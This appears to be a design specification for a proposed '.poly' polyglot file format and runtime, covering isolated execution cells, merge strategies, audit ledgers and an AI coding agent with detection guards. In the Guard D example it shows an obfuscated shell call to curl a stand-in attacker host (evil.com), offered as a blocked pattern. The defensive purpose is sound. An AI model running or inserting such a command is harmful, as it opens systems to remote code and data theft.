The Complete `.poly` Specification

A Systematic Guide to the Polyglot Feature Runtime

---

Table of Contents

1. [What is `.poly`?](#1-what-is-poly)
2. [The Core Philosophy](#2-the-core-philosophy)
3. [The File Format](#3-the-file-format)
4. [Language Blocks](#4-language-blocks)
5. [Cross-File Linking](#5-cross-file-linking)
6. [The Distributed Runtime](#6-the-distributed-runtime)
7. [Merge Strategies](#7-merge-strategies)
8. [The Error System](#8-the-error-system)
9. [The Contract Layer](#9-the-contract-layer)
10. [Governance & Auditability](#10-governance--auditability)
11. [The IDE Agent](#11-the-ide-agent)
12. [Configuration & Secrets](#12-configuration--secrets)
13. [Testing Inside `.poly`](#13-testing-inside-poly)
14. [Deployment & Operations](#14-deployment--operations)
15. [SOLID Principles](#15-solid-principles)
16. [Implementation Roadmap](#16-implementation-roadmap)
17. [Summary](#17-summary)

---

1. What is `.poly`?

`.poly` is a new kind of source file. Instead of one file containing one language (like `.py` for Python or `.ts` for TypeScript), a `.poly` file contains the same feature written in multiple languages, all in one place.

Think of it like a blueprint that shows the same room from different angles. A `.poly` file shows the same feature — say, "user login" — as it appears in Python, TypeScript, Java, Go, or any other language. But it is not just documentation. It is executable, governed, and self-auditing.

---

2. The Core Philosophy

2.1 Feature-Centric, Not Language-Centric

Traditional codebases are organized by language:

```
backend/
  auth.py
  models.py
frontend/
  Login.tsx
  api.ts
```

This forces developers to jump between folders and languages to understand one feature. `.poly` inverts this:

```
auth-login.poly
  → Python model
  → Python service
  → TypeScript UI component
  → Java session handler
  → Go rate limiter
```

One file = One complete feature = One context window.

2.2 Fail-Partial, Not Fail-All

In most systems, if one part crashes, everything stops. In `.poly`, each language block runs in its own isolated container (called a Cell). If the Python block crashes, the TypeScript and Java blocks keep running. The system collects whatever succeeded and moves forward.

2.3 Self-Describing and Self-Auditing

Every `.poly` file explains why things are done, not just what is done. It carries its own documentation, error translations, decision records, and audit history inside itself. When an auditor asks "Why did you use this approach?" the answer is already in the file.

2.4 Zero-Config Linking

Files talk to each other through simple filesystem references. No API keys, no network calls, no package registries required for basic integration.

---

3. The File Format

3.1 Basic Structure

A `.poly` file is a plain text file. It contains:
- Comments
- Directives (instructions to the runtime)
- Language blocks (actual code)
- Link statements
- Metadata blocks

3.2 Syntax Rules

Rule	Description	
Encoding	UTF-8 only	
Line endings	LF (Unix-style)	
Comments	`#` at the start of a line	
Delimiters	`@` at the start of a line triggers a command	
Case sensitivity	Language names are lowercase (`@python`, not `@Python`)	

3.3 Example Skeleton

```poly
# This is a comment
# auth-login.poly — Complete authentication feature

@contract
feature_id: "AUTH-742"
owner: "platform-team"
@end

@link ./user.poly::python[model] as UserModel

@schema LoginRequest
  email: string
  password: string
@end

@python[service]
def login(req: LoginRequest):
    user = UserModel.find_by_email(req.email)
    return user
@end

@typescript[component]
function LoginForm() {
    return <form>...</form>;
}
@end

@merge strategy="first-success"
@end
```

---

4. Language Blocks

4.1 The `@lang` Syntax

To write code in a language, you use:

```poly
@python
# Python code here
@end
```

Or with a metadata tag:

```poly
@python[service]
# This is the service layer
@end

@typescript[ui]
// This is the UI layer
@end

@java[handler]
// Java handler code
@end
```

4.2 Why `@end` is Required

`.poly` uses explicit `@end` markers instead of implicit "next block ends previous" because:
- It is unambiguous
- It allows empty lines inside blocks without confusion
- It prevents accidents where an indented `@decorator` in Python is mistaken for a new `.poly` block

Collision Protection:
In Python, `@dataclass` is a decorator. The parser knows the difference because:
- `@python` at the start of a line = delimiter (command for `.poly`)
- `@dataclass` with indentation = Python code (ignored by `.poly` parser)

4.3 Metadata Tags [brackets]

Metadata tags describe the role of the code, not the language:

Tag	Meaning	
`[model]`	Data models, schemas, structs	
`[service]`	Business logic, core algorithms	
`[router]`	API endpoints, controllers	
`[component]`	UI components	
`[test:unit]`	Unit tests	
`[test:integration]`	Integration tests	
`[test:security]`	Security/compliance tests	

This lets you target specific layers when linking or extracting.

---

5. Cross-File Linking

5.1 The `@link` Statement

One `.poly` file can reference another:

```poly
@link ./auth.poly as auth
```

This makes all blocks from `auth.poly` available under the `auth` namespace.

5.2 Cherry-Picking

You don't have to import everything. You can target specific languages or layers:

```poly
# Only the Python service block
@link ./auth.poly::python[service] as AuthService

# Only the model layer, across all languages
@link ./auth.poly::model as AuthModels

# Specific language + specific layer
@link ./auth.poly::typescript[component] as LoginForm
```

5.3 How Linking Works

1. The parser reads the `@link` statement
2. It resolves the relative filesystem path
3. It loads the target `.poly` file
4. It extracts only the requested blocks
5. It makes them available to the current file's blocks

No network, no API keys, no package manager. Just filesystem references.

5.4 Governance Lock

For strict environments, links must be approved in `.poly/governance.lock`:

```yaml
links:
  - from: "payments.poly"
    to: "auth.poly"
    approved_by: "architecture-review"
    expires: "2027-07-01"
```

The runtime will refuse to resolve links not present in this file.

---

6. The Distributed Runtime

6.1 Cells: Isolated Execution Units

When `.poly` runs, it does not execute code in one big process. It creates Cells — isolated containers for each language block.

Think of a Cell like a shipping container:
- It has its own resources (CPU, memory)
- It cannot see other containers
- If it catches fire, the ship doesn't sink

```
┌─────────────────────────────────────┐
│         .poly Runtime Kernel        │
│  ┌─────────┐ ┌─────────┐ ┌────────┐│
│  │ Cell-P  │ │ Cell-T  │ │ Cell-J ││
│  │ Python  │ │ Node.js │ │  JVM   ││
│  │ 256MB   │ │ 256MB   │ │ 512MB  ││
│  │ 5s CPU  │ │ 5s CPU  │ │ 5s CPU ││
│  │ No net  │ │ No net  │ │ No net ││
│  └────┬────┘ └────┬────┘ └───┬────┘│
│       └─────────────┴──────────┘     │
│            Message Bus               │
└─────────────────────────────────────┘
```

6.2 Process Isolation

Each Cell runs in:
- Its own process (if one segfaults, others survive)
- cgroups (Linux control groups) for resource limits
- Network namespace with no outbound access by default
- seccomp filters to block dangerous system calls

6.3 The Message Bus

Cells cannot talk to each other directly. They communicate through a Message Bus — a central post office that routes messages.

When the Python Cell finishes, it sends a message:

```json
{
  "msg_id": "uuid-123",
  "source": "auth.poly::@python[service]",
  "type": "result",
  "payload": {"user_id": "u-99"},
  "timestamp": "2026-07-24T10:00:00Z"
}
```

The TypeScript Cell can subscribe to messages with matching schemas. The runtime automatically converts formats (Python dict → JSON → TypeScript object).

6.4 Fail-Partial in Practice

```poly
@python
def process():
    raise ConnectionError("Database down")
@end

@typescript
function process() {
    return {status: "ok", fallback: "cache"};
}
@end
```

Result:

```json
{
  "python": {"status": "failed", "error": "Database down"},
  "typescript": {"status": "success", "output": {"status":"ok"}}
}
```

The TypeScript block succeeded even though Python failed. The system as a whole remains operational.

6.5 Resource Caps & Timeouts

Every Cell has strict limits:
- CPU time: Maximum seconds of CPU usage
- Memory: Hard limit via cgroups (OOM kills only that Cell)
- Timeout: Absolute deadline from the `@contract`

```poly
@contract
timeout_ms: 200
memory_mb: 256
cpu_seconds: 5
@end
```

If a Cell exceeds any limit, the scheduler hard-kills it and marks it as `TIMEOUT` or `OOM`.

6.6 Circuit Breaker

If the Python Cell fails 5 times in 60 seconds, the Circuit Breaker trips:
- New requests skip the Python Cell
- The system relies on fallback languages
- After a cooldown period, it tries Python again (half-open state)

This prevents cascading failures.

---

7. Merge Strategies

When multiple Cells return results, the `@merge` directive decides how to combine them.

7.1 Available Strategies

Strategy	Behavior	Use Case	
`first-success`	Return the first result that succeeds; ignore the rest	Speed-critical operations	
`all-success`	Wait for all; fail if any block errors	Consistency-critical operations	
`vote`	Wait for all; return the majority result; flag dissent	Byzantine fault tolerance	
`fallback`	Try languages in order; stop at first success	Reliability-critical operations	
`parallel-collect`	Run all; return a map of all results regardless of failures	Monitoring/debugging	

7.2 Example

```poly
@merge strategy="fallback" order=["python", "typescript", "java"]
@end

@python
def compute(): return slow_calculation()
@end

@typescript
function compute() { return fast_approximation(); }
@end

@java
public Result compute() { return cached_result(); }
@end
```

If Python is slow or fails, TypeScript serves the request. If TypeScript also fails, Java is the final safety net.

---

8. The Error System

8.1 The Problem with Raw Errors

Stack traces like `AttributeError: 'NoneType' object has no attribute 'strip'` are written for compiler engineers, not application developers. They are cryptic, inconsistent across languages, and unhelpful for debugging business logic.

8.2 The `@error-map` Solution

`.poly` uses user-extendable error maps that translate raw errors into plain English:

```poly
@error-map language="python"
AttributeError:NoneType:strip → 
  "You called .strip() on a variable that has no value (None). 
   Check if your database query returned a result on line {line}."
  
ModuleNotFoundError:stripe_bad → 
  "The module 'stripe_bad' is not installed. Did you mean 'stripe'? 
   Run: pip install stripe"

ConnectionError:payment-gateway →
  severity: "critical"
  translated: "Payment gateway unreachable. Fallback activated."
  auto_action: "alert-oncall"
@end
```

8.3 Layered Resolution

Error maps are checked in this order:
1. User-defined `@error-map` in the current `.poly` file (highest priority)
2. Project-wide maps in `.poly/error-maps/`
3. Built-in maps shipped with the runtime
4. Raw error (fallback if no map matches)

8.4 Audit Trail for Errors

Every error translation is logged:

```
audit: err-9f2d1a
  timestamp: 2026-07-24T10:15:00Z
  file: payments.poly
  block: @python[service]
  raw_error: "ConnectionError: payment-gateway"
  translated: "Payment gateway unreachable..."
  map_source: ./my-errors.poly
  llm_used: false
```

This creates a complete, searchable history of every failure and how it was interpreted.

---

9. The Contract Layer

9.1 The `@contract` Block

Every `.poly` file starts with a contract — the immutable agreement about what this feature does, who owns it, and how it behaves.

```poly
@contract
feature_id: "AUTH-2026-0742"
owner: "platform-security-team"
approvers: ["alice.chen@org.com", "raj.patel@org.com"]
classification: "sensitive"
retention_years: 7
schema_version: "1.2.0"
backward_compatible_with: ["1.0.0", "1.1.0"]
timeout_ms: 200
change_type: "major"
review_required: true
@end
```

Key fields:
- `feature_id`: Unique identifier
- `approvers`: Separation of duties (two people must approve)
- `classification`: Sensitivity level (public, internal, sensitive, restricted)
- `retention_years`: How long audit logs must be kept
- `schema_version`: Semantic versioning for the contract itself
- `timeout_ms`: SLA requirement
- `change_type`: Minor (safe), major (needs review), or emergency (break-glass)

9.2 The `@schema` Block

Schemas define the shape of data that crosses boundaries:

```poly
@schema LoginRequest
  email: string<format:email>
  password: string<min:8,max:128>
  mfa_token: string<regex:"^\d{6}$"> | null
@end

@schema LoginResponse
  session_id: uuid
  risk_score: number<min:0,max:1>
  requires_step_up: boolean
@end
```

Why this matters: The schema is language-agnostic. The Python Cell and TypeScript Cell both receive the same contract about what data looks like. The runtime validates messages against schemas before they enter the bus.

9.3 Versioning & Compatibility

Contracts use semantic versioning:
- Patch (1.0.1): Bug fixes, no schema changes
- Minor (1.1.0): New optional fields added
- Major (2.0.0): Breaking changes

The `poly compat` tool verifies that new versions don't break old consumers.

---

10. Governance & Auditability

10.1 `@rationale` — Why We Did It

Every significant decision is recorded:

```poly
@rationale for="python[service].hash_password"
standard: "OWASP-Password-Storage"
reason: "bcrypt is adaptive and slow-by-design, making brute-force attacks expensive. 
         SHA-256 is a general-purpose hash, not suitable for passwords."
decision_date: "2026-07-20"
reviewer: "security-team"
alternatives_considered: ["argon2", "scrypt", "pbkdf2"]
selected: "bcrypt"
rejected_reasons:
  argon2: "Not yet approved by internal crypto board; Q4 review scheduled"
  scrypt: "Memory-hard properties cause issues in containerized environments"
  pbkdf2: "Insufficient iteration count for current threat model"
@end
```

When someone asks "Why bcrypt?" the answer is in the file. Not in Slack. Not in a forgotten Jira ticket.

10.2 `@decision` — Variable-Level Reasoning

```poly
@decision for="typescript[component].email"
variable: "email"
choice: "useState over useRef"
context: "Email must trigger re-render for validation messages and submit button state."
alternatives_rejected: 
  - "useRef: no re-render on change"
  - "Redux: overkill for local form state"
  - "Zustand: unnecessary dependency for single component"
@end
```

This captures trade-off analysis — the mark of mature engineering.

10.3 `@audit` — The Change Log

Every modification is recorded:

```poly
@audit
entry: "2026-07-24T10:15:00Z"
agent: "poly-ide-agent-v2"
action: "refactored hash_password to use argon2"
rationale_ref: "R-742"
human_approval: "required"
approved_by: "alice.chen@org.com"
before_hash: "sha256:a1b2..."
after_hash: "sha256:c3d4..."
automated_tests_passed: ["unit", "property", "contract", "security"]
@end
```

10.4 The Tamper-Evident Ledger

All audit entries are stored in a Merkle tree (a cryptographic structure where changing one old entry breaks the chain):

```poly
@ledger
entry: "LE-2026-07-24-001"
type: "code_change"
author: "dev@org.com"
reviewer: "lead@org.com"
before_hash: "sha256:a1b2..."
after_hash: "sha256:c3d4..."
merkle_root: "sha256:abc9..."
@end
```

Verification: `poly audit verify-chain` checks that no historical entry has been modified. Any tampering is detected immediately.

10.5 Attestation & Cryptographic Identity

```poly
@attestation
signer: "alice.chen@org.com"
role: "senior-engineer"
gpg_fingerprint: "A1B2C3..."
signed_at: "2026-07-24T08:04:00Z"
# Signature covers: contract, schemas, standards, rationale, decisions
@end
```

Separation of Duties: Critical files require two distinct signers. The parser rejects files with only one approver for `sensitive` or `restricted` classifications.

---

11. The IDE Agent

11.1 The Problem

Current AI coding assistants (GitHub Copilot, Cursor, etc.) have three major flaws:
1. Context fragmentation: They see 3 random files, not the whole feature
2. Alien code generation: They invent imports, variables, and log files that don't belong
3. Unauditable suggestions: No record of why the AI suggested what it did

11.2 The Context Package

When editing a `.poly` file, the IDE agent feeds the AI the entire feature context:

```yaml
context_package:
  active_file: auth.poly
  active_block: "@python[service]"
  full_source: <entire auth.poly content>
  linked_files: [user.poly, audit.poly]
  standards: [auth.poly::@standard, .poly/standards.yaml]
  error_maps: [auth.poly::@error-map, .poly/errors.yaml]
  rationale: [auth.poly::@rationale]
  decisions: [auth.poly::@decision]
```

The AI sees the model definition, the service logic, the UI component, the error maps, and the rationale — all at once. It cannot hallucinate a `user_id` variable because it sees the `@schema` three blocks up.

11.3 The Six Guards

Guard A: Import Allowlist (`@standard`)

```poly
@standard language="python"
allowed_imports: ["pydantic", "sqlalchemy", "internal.db", "internal.audit"]
forbidden_patterns: ["import requests", "import urllib3", "print(", "bare except:"]
@end
```

If the AI suggests `import requests`, the agent blocks it:

> "Import 'requests' is not in the allowed list. Use 'internal.http_client' instead."

Guard B: Variable Existence
Before applying a suggestion, the agent checks: "Does this variable exist in scope?"

If the AI suggests `UserProfile.find_by_id()` but `UserProfile` is not defined in the current file or any `@link`ed file, the agent rejects it and suggests:

> "Variable 'UserProfile' not found. Defined models: User, Account, Session. Did you mean 'User'?"

Guard C: Ghost File Detection
The AI loves generating debug scaffolding:

```python
with open("debug_log.txt", "a") as f:  # BLOCKED
    f.write(f"User {user_id} logged in\n")
```

The agent detects file-writing patterns and replaces them with:

```python
ctx.audit.emit("login", user_id=user_id, timestamp=now())  # ALLOWED
```

No ad-hoc log files. No `print()` debugging. Everything goes through structured channels.

Guard D: Dynamic Code Detection

```python
__import__('os').system('curl https://evil.com')  # BLOCKED
eval("dangerous_code")                             # BLOCKED
exec("import subprocess")                          # BLOCKED
```

The agent detects obfuscated imports and dynamic execution. It logs a `security_event` to the audit ledger and alerts the security team.

Guard E: Rationale Contradiction

```python
# @rationale says: "Use bcrypt, not argon2, per internal crypto board"
# AI suggests:
return argon2.PasswordHasher().hash(pw)  # BLOCKED
```

The agent rejects it:

> "This contradicts @rationale R-742. Override requires review board approval."

Guard F: Secret Leakage

```python
print(f"Connecting with key: {api_key}")  # BLOCKED
```

The agent routes secrets through `ctx.secrets.get()` and ensures they are redacted in all logs.

11.4 Suggestion Audit Trail

Every AI suggestion that is accepted appends an entry:

```poly
@audit
entry: "2026-07-24T10:15:00Z"
agent: "poly-ide-agent-v2"
action: "suggestion_applied"
location: "auth.poly::@python[service]::hash_password"
before: "return bcrypt.hashpw(plain.encode(), bcrypt.gensalt())"
after: "return argon2.PasswordHasher().hash(plain)"
trigger: "human_accepted"
context_window_tokens: 4200
@end
```

---

12. Configuration & Secrets

12.1 The `@config` Block

```poly
@config
environment: "${POLY_ENV}"  # dev, staging, production
secrets_provider: "vault"
@end
```

12.2 The `@secret` Block

Secrets are declared, never hardcoded:

```poly
@secret stripe_api_key
  provider: "vault"
  path: "secret/payments/stripe"
  key: "api_key"
  required_by: ["@python[service]", "@typescript[service]"]
@end
```

12.3 The `@env` Block

Environment-specific settings:

```poly
@env production
  database_url: "${DATABASE_URL}"  # Injected by runtime
  log_level: "warn"
  circuit_breaker_threshold: 5
@end

@env development
  database_url: "sqlite:///tmp/dev.db"
  log_level: "debug"
  circuit_breaker_threshold: 100
@end
```

12.4 The Execution Context

Every Cell receives an `ExecutionContext` object:

Property	Purpose	
`ctx.trace_id`	Distributed tracing correlation ID	
`ctx.deadline`	Absolute timeout (avoids clock skew)	
`ctx.store`	Typed key-value interface to external state (Redis, Postgres)	
`ctx.audit`	Structured audit channel	
`ctx.secrets`	Capability-based secret access	

Example:

```python
@python[service]
def process_payment(req):
    api_key = ctx.secrets.get("stripe_api_key")
    ctx.audit.emit("payment_initiated", amount=req.amount)
    return gateway.charge(api_key, req.amount)
@end
```

No secret ever appears in source code. No secret ever appears in logs.

---

13. Testing Inside `.poly`

13.1 The Testing Pyramid

```poly
@python[test:unit]
def test_authenticate_valid():
    req = LoginRequest(email="alice@org.com", password="Valid123!")
    resp = authenticate(req)
    assert resp.risk_score < 0.3
@end

@python[test:property]
def test_authenticate_never_raises(req: LoginRequest):
    # Generates 10,000 random valid inputs
    resp = authenticate(req)
    assert isinstance(resp.session_id, UUID)
@end

@python[test:contract]
def test_schema_compliance():
    assert_signature(authenticate, LoginRequest, LoginResponse)
@end

@python[test:security]
def test_no_credential_logging():
    with capture_audit_log() as log:
        authenticate(LoginRequest(email="x", password="SECRET123"))
    assert "SECRET123" not in log.raw
    assert "SECRET123" not in log.translated
@end
```

13.2 Test Execution Order

1. Unit — Fast, every commit
2. Property — 10,000 iterations, every pull request
3. Contract — Verifies `@schema` adherence
4. Integration — Requires staging environment
5. Security — Scans logs for credential leakage

---

14. Deployment & Operations

14.1 The `@deploy` Block

```poly
@deploy
strategy: "blue-green"  # blue-green | canary | rolling
health_check: "/health"
rollback_on: ["error_rate > 1%", "latency_p99 > 500ms"]
auto_rollback: true

@canary
  percentage: 5
  duration: "10m"
  metrics: ["error_rate", "latency_p99", "business_event_success"]
  promote_if: "error_rate < 0.1% for 5m"
  rollback_if: "error_rate > 0.5% or latency_p99 > 200ms"
@end
@end
```

14.2 Disaster Recovery

```poly
@contract
continuity:
  rpo_minutes: 5       # Recovery Point Objective
  rto_minutes: 15      # Recovery Time Objective
  backup_regions: ["us-east-1", "eu-west-1"]
  ledger_replication: "synchronous"
  cell_state: "stateless"
@end
```

Recovery is replay, not restore:
1. Secondary region spins up cell pool
2. Replays messages from the ledger
3. Resumes execution deterministically

14.3 Observability

Component	Tool	Purpose	
Traces	OTLP (OpenTelemetry)	Follow a request across Cells	
Metrics	Prometheus	SLI/SLO dashboards	
Alerts	PagerDuty/Opsgenie	On-call escalation	

Key SLIs:
- Cell startup latency: <50ms
- Cross-cell message latency: <5ms
- Fallback rate: <0.1%
- Audit log durability: 100%

---

15. SOLID Principles

Principle	How `.poly` Implements It	
Single Responsibility	Each block has one job: `@contract` governs, `@schema` validates, `@python[service]` implements, `@test:unit` verifies.	
Open/Closed	`@standard` and `@error-map` are open for extension (new rules, new languages) but closed for modification (versioned, immutable).	
Liskov Substitution	Any Cell runner honoring `@schema` can replace another. The Router is language-agnostic.	
Interface Segregation	`@test:unit`, `@test:security`, `@audit`, `@rationale` are thin, role-specific interfaces.	
Dependency Inversion	The Runtime depends on abstractions (`MessageBus`, `Store`, `SecretProvider`), not on Python/Node/JVM directly.	

---

16. Implementation Roadmap

Phase 1: Specification & Parser (Weeks 1–4)
- Grammar specification (`@lang`, `@end`, `@link`, `@contract`)
- `poly parse` — AST generation
- `poly validate` — Syntax checking, circular link detection
- `poly spec sign` — GPG attestation
- Deliverable: A `.poly` file can be parsed and validated

Phase 2: Resilient Runtime (Weeks 5–11)
- Cell-based execution (cgroups, seccomp, namespaces)
- Message bus with append-only ledger
- Circuit breaker and bulkhead implementation
- `ExecutionContext` (trace, store, secrets, audit)
- Deliverable: `poly run auth.poly` executes blocks in isolated Cells

Phase 3: SDLC Integration (Weeks 12–17)
- `@test:unit`, `@test:property`, `@test:contract`, `@test:security`
- `@config`, `@secret`, `@env` abstractions
- CI/CD Action: `poly sdlc verify --stage {code|test|deploy}`
- Ticketing system integration (Jira, ServiceNow)
- Deliverable: Immutable deployment pipeline

Phase 4: Compliance Engine (Weeks 18–22)
- Merkle-tree audit ledger
- `poly audit verify-chain`
- `poly audit report --framework {SOC2|ISO27001|Custom}`
- Error-map compliance classifier
- Deliverable: Self-auditing codebase

Phase 5: Enterprise Tooling (Weeks 23–28)
- OTLP tracing + Prometheus metrics
- IDE Agent with Guards A–F
- `@deploy` abstraction (canary, blue-green)
- Multi-region DR with deterministic replay
- Deliverable: Production-ready operations

Phase 6: Ecosystem (Weeks 29–32)
- `@requires` dependency management per Cell
- `poly compat` backward compatibility checker
- `.poly` registry for reusable features
- Migration tools from Jupyter, Literate Programming
- Deliverable: Shareable, versioned feature modules

---

17. Summary

`.poly` is a feature-centric, polyglot, self-auditing runtime with these unique properties:

1. One file = One feature. All languages for a feature live together, giving AI and humans complete context.
2. Fail-partial resilience. If Python crashes, TypeScript and Java keep running.
3. Zero-config linking. `@link ./file.poly` connects features without APIs or networks.
4. Plain-language errors. `@error-map` translates cryptic stack traces into actionable guidance without LLMs.
5. Self-describing governance. `@rationale`, `@decision`, and `@audit` answer "why" forever.
6. Tamper-evident history. The Merkle ledger proves nothing was altered after the fact.
7. Alien-code prevention. The IDE agent stops AI from generating imports, variables, and log files that violate standards.
8. SOLID by design. The architecture enforces separation of concerns, substitution, and dependency inversion at the file level.

It is not a replacement for Python, TypeScript, or Java. It is a governance and execution layer that sits above them, turning a fragmented polyglot codebase into a unified, resilient, auditable system.